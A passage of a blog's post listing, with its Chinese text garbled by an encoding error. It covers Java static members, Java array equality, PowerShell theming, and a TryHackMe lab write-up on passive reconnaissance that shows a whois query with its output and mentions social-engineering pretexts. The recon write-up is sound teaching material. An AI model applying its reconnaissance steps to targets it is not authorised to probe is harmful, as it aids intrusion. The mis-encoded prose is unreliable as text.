            <a href="/2023/04/02/Java%E4%B8%AD%E7%9A%84%E9%9D%99%E6%80%81%E4%B8%8E%E9%9D%9E%E9%9D%99%E6%80%81/" class="post-title-link" itemprop="url">Javaä¸­çš„é™æ€ä¸éé™æ€</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-04-02 17:51:58" itemprop="dateCreated datePublished" datetime="2023-04-02T17:51:58+08:00">2023-04-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-12-31 14:38:02" itemprop="dateModified" datetime="2023-12-31T14:38:02+08:00">2023-12-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>852</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ul>
<li><p>Javaä¸­çš„<code>Object</code>ï¼ˆå¯¹è±¡ï¼‰æ˜¯ç±»çš„å®ä¾‹</p></li>
<li><p>é™æ€æˆå‘˜å’Œæ–¹æ³•ç”±<code>static</code>ä¿®é¥°ï¼Œå±äºç±»ï¼Œå¯ä»¥é€šè¿‡ç±»åç›´æ¥è®¿é—®ï¼Œæ— éœ€åˆ›å»ºç±»çš„å®ä¾‹ã€‚</p></li>
<li><p>éé™æ€æˆå‘˜å’Œæ–¹æ³•å±äºç±»çš„å®ä¾‹ï¼Œä¸éœ€è¦<code>static</code>ä¿®é¥°ï¼Œéé™æ€æˆå‘˜å’Œæ–¹æ³•å¿…é¡»é€šè¿‡ç±»çš„å®ä¾‹ï¼ˆå¯¹è±¡ï¼‰è®¿é—®ï¼ˆé€šè¿‡newå…³é”®å­—åˆ›å»ºå¯¹è±¡åï¼Œå†é€šè¿‡å¯¹è±¡è°ƒç”¨ï¼‰ã€‚</p></li>
<li><p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example</span> {</span><br><span class="line">    <span class="comment">// é™æ€æˆå‘˜å˜é‡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">staticVariable</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// éé™æ€æˆå‘˜å˜é‡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">nonStaticVariable</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é™æ€æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticMethod</span><span class="params">()</span> {</span><br><span class="line">        System.out.println(<span class="string">"This is a static method."</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éé™æ€æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">nonStaticMethod</span><span class="params">()</span> {</span><br><span class="line">        System.out.println(<span class="string">"This is a non-static method."</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="comment">// è®¿é—®é™æ€æˆå‘˜å’Œæ–¹æ³•</span></span><br><span class="line">        Example.staticVariable = <span class="number">1</span>;</span><br><span class="line">        Example.staticMethod();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºç±»çš„å®ä¾‹å¹¶è®¿é—®éé™æ€æˆå‘˜å’Œæ–¹æ³•</span></span><br><span class="line">        <span class="type">Example</span> <span class="variable">example</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line">        example.nonStaticVariable = <span class="number">1</span>;</span><br><span class="line">        example.nonStaticMethod();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªåä¸º <code>Example</code>
çš„ç±»ï¼Œå¹¶åœ¨å…¶ä¸­å®šä¹‰äº†ä¸€ä¸ªé™æ€æˆå‘˜å˜é‡
<code>staticVariable</code>ï¼Œä¸€ä¸ªéé™æ€æˆå‘˜å˜é‡
<code>nonStaticVariable</code>ï¼Œä¸€ä¸ªé™æ€æ–¹æ³• <code>staticMethod</code>
å’Œä¸€ä¸ªéé™æ€æ–¹æ³•
<code>nonStaticMethod</code>ã€‚æˆ‘ä»¬å±•ç¤ºäº†å¦‚ä½•è®¿é—®é™æ€å’Œéé™æ€æˆå‘˜å’Œæ–¹æ³•ã€‚</p></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/02/Java%E4%B8%AD%E7%9A%84%E6%95%B0%E7%BB%84%E7%9B%B8%E7%AD%89%E9%97%AE%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/02/Java%E4%B8%AD%E7%9A%84%E6%95%B0%E7%BB%84%E7%9B%B8%E7%AD%89%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">Javaä¸­çš„æ•°ç»„ç›¸ç­‰é—®é¢˜</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-04-02 17:32:38 / ä¿®æ”¹æ—¶é—´ï¼š17:37:40" itemprop="dateCreated datePublished" datetime="2023-04-02T17:32:38+08:00">2023-04-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>433</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ç¤ºä¾‹">ç¤ºä¾‹ï¼š</h2>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] arr1 = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>};</span><br><span class="line"><span class="type">int</span>[] arr2 = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>};</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (arr1 == arr2) {</span><br><span class="line">    System.out.println(<span class="string">"ä¸¤ä¸ªæ•°ç»„ç›¸ç­‰"</span>);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    System.out.println(<span class="string">"ä¸¤ä¸ªæ•°ç»„ä¸ç›¸ç­‰"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>ä¸Šè¿°ä»£ç è¾“å‡ºç»“æœä¸ºï¼š<code>ä¸¤ä¸ªæ•°ç»„ä¸ç›¸ç­‰</code></p>
<p>å½“æˆ‘ä»¬æ¯”è¾ƒä¸¤ä¸ªæ•°ç»„æ˜¯å¦ç›¸ç­‰æ—¶ï¼Œæˆ‘ä»¬ä¸èƒ½ç®€å•åœ°ä½¿ç”¨<code>==</code>è¿ç®—ç¬¦ã€‚<code>==</code>è¿ç®—ç¬¦æ¯”è¾ƒçš„æ˜¯å†…å­˜ä¸­çš„ä½ï¼Œå³ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œ<code>arr1 == arr2</code>å°†æ¯”è¾ƒ<code>arr1</code>å’Œ<code>arr2</code>çš„<strong>åœ°å€</strong>æ˜¯å¦ç›¸åŒï¼Œè€Œä¸æ˜¯æ•°ç»„ä¸­çš„å€¼æ˜¯å¦ç›¸åŒã€‚</p>
<h2 id="è§£å†³æ–¹æ³•">è§£å†³æ–¹æ³•ï¼š</h2>
<p>Javaä¸­æä¾›äº†<code>java.util.Arrays.equals</code>æ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªæ•°ç»„æ˜¯å¦ç›¸ç­‰ã€‚è¿™ä¸ªæ–¹æ³•ä¼šæ¯”è¾ƒä¸¤ä¸ªæ•°ç»„çš„é•¿åº¦å’Œæ¯ä¸ªå…ƒç´ çš„å€¼æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœä¸¤ä¸ªæ•°ç»„çš„é•¿åº¦å’Œæ¯ä¸ªå…ƒç´ çš„å€¼éƒ½ç›¸ç­‰ï¼Œåˆ™è¿”å›<code>true</code>ï¼Œå¦åˆ™è¿”å›<code>false</code>ã€‚æˆ–æ˜¯ç”¨å¾ªç¯çš„æ–¹å¼æ¯”è¾ƒæ¯ä¸ªå…ƒç´ ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/14/%E4%BF%AE%E6%94%B9PowerShell%E4%B8%BB%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/14/%E4%BF%AE%E6%94%B9PowerShell%E4%B8%BB%E9%A2%98/" class="post-title-link" itemprop="url">ä¿®æ”¹PowerShellçš„ä¸»é¢˜</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-03-14 00:00:00 / ä¿®æ”¹æ—¶é—´ï¼š11:23:02" itemprop="dateCreated datePublished" datetime="2023-03-14T00:00:00+08:00">2023-03-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%91%BD%E4%BB%A4%E8%A1%8C/" itemprop="url" rel="index"><span itemprop="name">å‘½ä»¤è¡Œ</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>317</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>1 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>æˆ‘ä½¿ç”¨çš„æ˜¯<code>oh-my-posh</code>ã€‚</p>
<p><code>oh-my-posh</code> æ˜¯ä¸€ä¸ª <code>PowerShell</code>
ä¸»é¢˜æ¡†æ¶ï¼Œç”¨äºç¾åŒ– <code>PowerShell</code>
æç¤ºç¬¦ï¼ˆpromptï¼‰ã€‚å®ƒå¯ä»¥è®©ä½ è‡ªå®šä¹‰ <code>PowerShell</code>
æç¤ºç¬¦çš„æ ·å¼ï¼Œä½¿å…¶æ›´åŠ æ˜“è¯»å’Œç¾è§‚ã€‚å¯å‚è€ƒå®˜ç½‘çš„ä¸»é¢˜æ ·å¼ï¼šhttps://ohmyposh.dev/docs/themes</p>
<p>é€šè¿‡è¾“å…¥</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-PoshPrompt PowerLine</span><br></pre></td></tr></tbody></table></figure>
<p>å¯é¢„è§ˆ<code>PowerLine</code>ä¸»é¢˜ï¼Œè¿™åªæ˜¯æš‚æ—¶æ€§çš„ <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/b5787722d59b4286b340086f0ab1145f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æƒ³è¦æ°¸ä¹…ä¿®æ”¹å¯é€šè¿‡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ç”¨è®°äº‹æœ¬æ‰“å¼€é…ç½®æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad $PROFILE</span><br></pre></td></tr></tbody></table></figure>
<p>æ‰“å¼€åå¦‚ä¸‹ï¼š <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/31e8516211044bc2a8bd3b0646a5db98.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶ä¸­çš„ä¸»é¢˜å¯ä¿®æ”¹é»˜è®¤æ‰“å¼€ä¸»é¢˜ï¼š <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/1648e8d3bcf6411b9d307a5aa18afb37.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
è‹¥å°†ä¸Šå›¾ä¸­çš„"Sorin"æ”¹ä¸ºâ€œAgnosterâ€ï¼Œåˆ™ä¸‹æ¬¡æ‰“å¼€power
shellä¾¿æ˜¯ä¿®æ”¹åçš„ä¸»é¢˜ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/28/Passive-Reconnaissance/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/Passive-Reconnaissance/" class="post-title-link" itemprop="url">Passive Reconnaissanceï¼ˆè¢«åŠ¨ä¾¦å¯Ÿï¼‰</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-02-28 14:30:13" itemprop="dateCreated datePublished" datetime="2023-02-28T14:30:13+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-01-18 22:45:42" itemprop="dateModified" datetime="2023-01-18T22:45:42+08:00">2023-01-18</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>6k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>5 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMeå®éªŒæˆ¿é—´ï¼šhttps://tryhackme.com/room/passiverecon</p>
<h2 id="introduction">Introduction</h2>
<p>ä¾¦å¯Ÿ(recon)å¯ä»¥å®šä¹‰ä¸ºæ”¶é›†ç›®æ ‡ä¿¡æ¯çš„åˆæ­¥è°ƒæŸ¥ã€‚æˆ‘ä»¬å°†ä¾¦å¯Ÿåˆ†ä¸ºï¼š</p>
<ol type="1">
<li>è¢«åŠ¨ä¾¦å¯Ÿ</li>
<li>ä¸»åŠ¨ä¾¦å¯Ÿ</li>
</ol>
<h3 id="è¢«åŠ¨ä¾¦å¯Ÿ">è¢«åŠ¨ä¾¦å¯Ÿ</h3>
<p>åœ¨è¢«åŠ¨ä¾¦å¯Ÿä¸­ï¼Œä½ å°†ä¾èµ–äºå…¬å¼€å¯ç”¨çš„çŸ¥è¯†ã€‚å®ƒæ˜¯ä½ å¯ä»¥ä»å…¬å…±å¯ç”¨èµ„æºè®¿é—®çš„çŸ¥è¯†ï¼Œè€Œæ— éœ€ç›´æ¥ä¸ç›®æ ‡è¿›è¡Œæ¥è§¦ã€‚æƒ³è±¡ä¸€ä¸‹ï¼Œä½ è¿œè¿œåœ°çœ‹ç€ç›®æ ‡é¢†åœ°ï¼Œå´æ²¡æœ‰è¸è¶³é‚£ç‰‡é¢†åœ°ã€‚</p>
<p>è¢«åŠ¨ä¾¦å¯ŸåŒ…æ‹¬è®¸å¤šæ´»åŠ¨ï¼š</p>
<ul>
<li>ä»å…¬å…±DNSæœåŠ¡å™¨æŸ¥æ‰¾åŸŸçš„ DNS è®°å½•ã€‚</li>
<li>æ£€æŸ¥ä¸ç›®æ ‡ç½‘ç«™ç›¸å…³çš„æ‹›è˜å¹¿å‘Šã€‚</li>
<li>é˜…è¯»æœ‰å…³ç›®æ ‡å…¬å¸çš„æ–°é—»æ–‡ç« ã€‚</li>
</ul>
<p>æœ¬æ–‡ä¸»è¦ä»‹ç»ä¸‰ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼š</p>
<ul>
<li><code>whois</code></li>
<li><code>nslookup</code></li>
<li><code>dig</code></li>
</ul>
<p>ä»¥åŠä¸¤ç§åœ¨çº¿æœåŠ¡çš„ä½¿ç”¨ï¼š</p>
<ul>
<li>DNSDumpster</li>
<li>Shodan.io</li>
</ul>
<p>è¿™ä¸¤ä¸ªåœ¨çº¿æœåŠ¡å…è®¸æˆ‘ä»¬æ”¶é›†æœ‰å…³ç›®æ ‡çš„ä¿¡æ¯ï¼Œè€Œæ— éœ€ç›´æ¥è¿æ¥åˆ°ç›®æ ‡ã€‚</p>
<h3 id="ä¸»åŠ¨ä¾¦å¯Ÿ">ä¸»åŠ¨ä¾¦å¯Ÿ</h3>
<p>å¦ä¸€æ–¹é¢ï¼Œä¸»åŠ¨ä¾¦å¯Ÿåˆ™ä¸èƒ½å¦‚æ­¤è°¨æ…åœ°è¿›è¡Œã€‚å®ƒéœ€è¦ä¸ç›®æ ‡ç›´æ¥æ¥è§¦ã€‚å°±åƒä½ æ£€æŸ¥é—¨çª—çš„é”ï¼Œä»¥åŠå…¶ä»–æ½œåœ¨çš„å…¥å£ã€‚</p>
<p>ä¸»åŠ¨ä¾¦å¯ŸåŒ…æ‹¬çš„æ´»åŠ¨å¦‚ä¸‹ï¼š</p>
<ul>
<li>è¿æ¥åˆ°å…¶ä¸­ä¸€ä¸ªå…¬å¸æœåŠ¡å™¨ï¼Œä¾‹å¦‚ï¼šHTTPã€FTPã€SMTPã€‚</li>
<li>æ‰“ç”µè¯åˆ°å…¬å¸è¯•å›¾è·å–ä¿¡æ¯ï¼ˆç¤¾ä¼šå·¥ç¨‹ï¼‰ã€‚</li>
<li>å†’å……ä¿®ç†å·¥è¿›å…¥å…¬å¸ã€‚</li>
</ul>
<p>è€ƒè™‘åˆ°ä¸»åŠ¨ä¾¦å¯Ÿçš„ä¾µå…¥æ€§ï¼Œé™¤éè·å¾—é€‚å½“çš„æ³•å¾‹æˆæƒï¼Œå¦åˆ™å¾ˆå¿«å°±ä¼šé™·å…¥æ³•å¾‹éº»çƒ¦ã€‚</p>
<h2 id="whois">Whois</h2>
<p>WHOIS æ˜¯éµå¾ª <a target="_blank" rel="noopener" href="https://www.ietf.org/rfc/rfc3912.txt">RFC
3912</a>
è§„èŒƒçš„è¯·æ±‚å’Œå“åº”åè®®ã€‚WHOISæœåŠ¡å™¨åœ¨TCPç«¯å£43ä¸Šä¾¦å¬ä¼ å…¥çš„è¯·æ±‚ã€‚åŸŸåæ³¨å†Œå•†è´Ÿè´£ç»´æŠ¤å…¶ç§ŸèµåŸŸåçš„WHOISè®°å½•ã€‚WHOISæœåŠ¡å™¨å›å¤ä¸è¯·æ±‚çš„åŸŸç›¸å…³çš„å„ç§ä¿¡æ¯ã€‚é€šè¿‡
WHOIS ï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š</p>
<ul>
<li>æ³¨å†Œå•†ï¼šåŸŸåæ˜¯é€šè¿‡å“ªä¸ªæ³¨å†Œå•†æ³¨å†Œçš„ï¼Ÿ</li>
<li>æ³¨å†Œäººçš„è”ç³»ä¿¡æ¯ï¼šå§“åã€ç»„ç»‡ã€åœ°å€ã€ç”µè¯ç­‰ã€‚(é™¤éé€šè¿‡éšç§æœåŠ¡éšè—)</li>
<li>åˆ›å»ºã€æ›´æ–°å’Œè¿‡æœŸæ—¥æœŸï¼šåŸŸåé¦–æ¬¡æ³¨å†Œæ˜¯ä»€ä¹ˆæ—¶å€™ï¼Ÿä¸Šæ¬¡æ›´æ–°æ˜¯ä»€ä¹ˆæ—¶å€™ï¼Ÿä»€ä¹ˆæ—¶å€™éœ€è¦æ›´æ–°ï¼Ÿ</li>
<li>åç§°æœåŠ¡å™¨(Name Server)ï¼šè¯·æ±‚å“ªä¸ªæœåŠ¡å™¨è§£æåŸŸåï¼Ÿ</li>
</ul>
<p>ä½¿ç”¨è¯­æ³•æ˜¯<code>whois DOMAIN_NAME</code>ï¼Œå…¶ä¸­<code>DOMAIN_NAME</code>æ˜¯ä½ è¯•å›¾è·å–ä¿¡æ¯çš„åŸŸã€‚å‡è®¾æˆ‘ä»¬éœ€è¦è·å–<code>tryhackme.com</code>çš„ä¿¡æ¯ï¼Œç›´æ¥æ‰§è¡Œ<code>whois tryhackme.com</code>ã€‚å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">user@TryHackMe$ whois tryhackme.com</span><br><span class="line">[Querying whois.verisign-grs.com]</span><br><span class="line">[Redirected to whois.namecheap.com]</span><br><span class="line">[Querying whois.namecheap.com]</span><br><span class="line">[whois.namecheap.com]</span><br><span class="line">Domain name: tryhackme.com</span><br><span class="line">Registry Domain ID: 2282723194_DOMAIN_COM-VRSN</span><br><span class="line">Registrar WHOIS Server: whois.namecheap.com</span><br><span class="line">Registrar URL: http://www.namecheap.com</span><br><span class="line">Updated Date: 2021-05-01T19:43:23.31Z</span><br><span class="line">Creation Date: 2018-07-05T19:46:15.00Z</span><br><span class="line">Registrar Registration Expiration Date: 2027-07-05T19:46:15.00Z</span><br><span class="line">Registrar: NAMECHEAP INC</span><br><span class="line">Registrar IANA ID: 1068</span><br><span class="line">Registrar Abuse Contact Email: abuse@namecheap.com</span><br><span class="line">Registrar Abuse Contact Phone: +1.6613102107</span><br><span class="line">Reseller: NAMECHEAP INC</span><br><span class="line">Domain Status: clientTransferProhibited https://icann.org/epp<span class="comment">#clientTransferProhibited</span></span><br><span class="line">Registry Registrant ID: </span><br><span class="line">Registrant Name: Withheld <span class="keyword">for</span> Privacy Purposes</span><br><span class="line">Registrant Organization: Privacy service provided by Withheld <span class="keyword">for</span> Privacy ehf</span><br><span class="line">[...]</span><br><span class="line">URL of the ICANN WHOIS Data Problem Reporting System: http://wdprs.internic.net/</span><br><span class="line">&gt;&gt;&gt; Last update of WHOIS database: 2021-08-25T14:58:29.57Z &lt;&lt;&lt;</span><br><span class="line"><span class="string">For more information on Whois status codes, please visit https://icann.org/epp</span></span><br></pre></td></tr></tbody></table></figure>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¤§é‡ä¿¡æ¯ï¼›æˆ‘ä»¬å°†æŒ‰ç…§æ˜¾ç¤ºçš„é¡ºåºæ£€æŸ¥å®ƒä»¬ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬æ³¨æ„åˆ°æˆ‘ä»¬è¢«é‡å®šå‘åˆ°<code>whois.namecheap.com</code>ä»¥è·å–ä¿¡æ¯ã€‚ç”±æ­¤å¯çŸ¥ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ<code>namecheap.com</code>ç›®å‰æ­£åœ¨ç»´æŠ¤è¯¥åŸŸåçš„WHOISè®°å½•ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åˆ›å»ºæ—¥æœŸä»¥åŠæœ€åæ›´æ–°æ—¥æœŸå’Œè¿‡æœŸæ—¥æœŸã€‚</p>
